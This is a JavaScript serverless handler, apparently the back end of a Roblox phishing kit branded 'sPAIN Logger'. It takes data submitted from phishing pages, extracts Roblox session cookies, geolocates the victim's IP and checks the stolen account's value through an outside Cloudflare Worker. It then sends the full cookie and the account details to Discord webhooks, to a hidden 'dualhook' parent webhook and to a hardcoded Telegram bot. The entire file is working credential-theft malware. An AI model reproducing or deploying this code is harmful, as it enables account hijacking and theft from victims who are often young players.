// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

// ── Body parser — handles object / string / Buffer ────────────────────────────
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try {
    return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw));
  } catch { return {}; }
}

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;

    let record = json.result;
    if (typeof record === 'string') {
      try { record = JSON.parse(record); } catch { return null; }
    }
    // Handle old double-wrap bug: { value: '{"slug":"...","webhook":"..."}' }
    if (record && typeof record.value === 'string' && !record.webhook) {
      try { record = JSON.parse(record.value); } catch {}
    }
    return record || null;
  } catch { return null; }
}

// ── IP Geo ────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

// ── Cookie extractor ──────────────────────────────────────────────────────────
const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);
  if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}

function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// ── Cloudflare Worker ─────────────────────────────────────────────────────────
async function getRobloxInfo(cookie, victimIp) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

// ── Slot summary ──────────────────────────────────────────────────────────────
function slotSummary(slots) {
  return Object.entries(slots || {})
    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
    .join('\n');
}

// ── Discord ───────────────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function sendValid(webhookUrl, { roblox, cookie, slots, ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title: `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
      description: `:fire: \`sPAIN\` :fire:\n\n[👤 Profile](https://www.roblox.com/users/${roblox.id}/profile)`,
      color: 5793266,
      thumbnail: { url: roblox.avatarUrl },
      fields: [
        { name: '🔴 Robux',      value: `**${roblox.robux?.toLocaleString() || 0}**`,                                             inline: true  },
        { name: '🎵 RAP',        value: `**${roblox.limitedsValue?.toLocaleString() || 0}** (${roblox.limitedsCount || 0} items)`, inline: true  },
        { name: '📊 Age',        value: `**${roblox.accountAgeDays}** days`,                                                      inline: true  },
        { name: '💳 Credit',     value: `**$${roblox.credit || 0}**`,                                                             inline: true  },
        { name: '🎫 Premium',    value: roblox.isPremium ? '✅ Yes' : '❌ No',                                                    inline: true  },
        { name: '👥 Groups',     value: `Owned: **${roblox.groupsOwned}** | R$: **${roblox.groupRobux?.toLocaleString() || 0}**`, inline: true  },
        { name: '⚙️ Account',    value: `Email: ${roblox.emailSet}\n2FA: ${roblox.twoFA}`,                                       inline: true  },
        { name: '🌐 IP',         value: `\`${ip || 'Unknown'}\``,                                                                 inline: true  },
        { name: '📍 Location',   value: `${geo?.city || '?'}, ${geo?.country || '?'}\n${geo?.isp || ''}`,                        inline: true  },
        { name: '🎮 Gamepasses', value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        { name: '📋 Slots',  value: `\`\`\`${slotSummary(slots).substring(0, 950)}\`\`\``, inline: false },
        { name: '🔐 Cookie', value: `\`\`\`${cookie.substring(0, 950)}\`\`\``,             inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
    }]
  });
}

async function sendInvalid(webhookUrl, { slots, ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title: '⚠️ Invalid Cookie — someone trolling 💀',
      description: 'Cookie was **invalid or fake**.',
      color: 0xff3333,
      fields: [
        { name: '🌐 IP',       value: `\`${ip || 'Unknown'}\``,                              inline: true  },
        { name: '📍 Location', value: `${geo?.city || '?'}, ${geo?.country || '?'}`,          inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                 inline: true  },
        { name: '📋 Slots',    value: `\`\`\`${slotSummary(slots).substring(0, 950)}\`\`\``, inline: false },
        { name: '🕐 Date',     value: now,                                                    inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` },
      timestamp: now
    }]
  });
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;

  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });

  // Respond immediately — client never sees a timeout or error from slow work
  res.status(200).json({ success: true });

  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
            || req.headers['x-real-ip'] || 'Unknown';

    const [geo, cookie] = await Promise.all([
      getIpGeo(ip),
      Promise.resolve(findCookie(slots))
    ]);

    const roblox   = cookie ? await getRobloxInfo(cookie, ip) : null;
    const isValid  = !!roblox;
    const now      = new Date().toISOString();
    const pageName = record.displayName || slug;
    const payload  = { roblox, cookie, slots, ip, geo, now, pageName };
    const sendFn   = isValid ? sendValid : sendInvalid;

    // Load dualhook parent if this is a child page
    let parent = null;
    if (record.dualhookParent) {
      parent = await redisGet(`slot:${record.dualhookParent}`);
    }

    // Both webhooks fire in parallel
    await Promise.all([
      sendFn(record.webhook, payload),
      parent?.webhook && parent.webhook !== record.webhook
        ? sendFn(parent.webhook, payload)
        : Promise.resolve()
    ]);

    await tgSend(isValid ? [
      `🚨 <b>VALID HIT</b>`,
      `👤 <b>${roblox.username}</b> ${roblox.isPremium ? '⭐' : ''}`,
      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
      `🌐 IP: <code>${ip}</code> — ${geo?.city || '?'}, ${geo?.country || '?'}`,
      `📄 Page: ${pageName}`,
      `🍪 Cookie: ✅ Captured`
    ].join('\n') : [
      `⚠️ <b>INVALID SUBMISSION</b>`,
      `📄 Page: ${pageName} (${slug})`,
      `🌐 IP: <code>${ip}</code> — ${geo?.city || '?'}, ${geo?.country || '?'}`,
      `🕐 ${now}`
    ].join('\n'));

  } catch (err) {
    console.error('Post-response error:', err.message);
  }
}
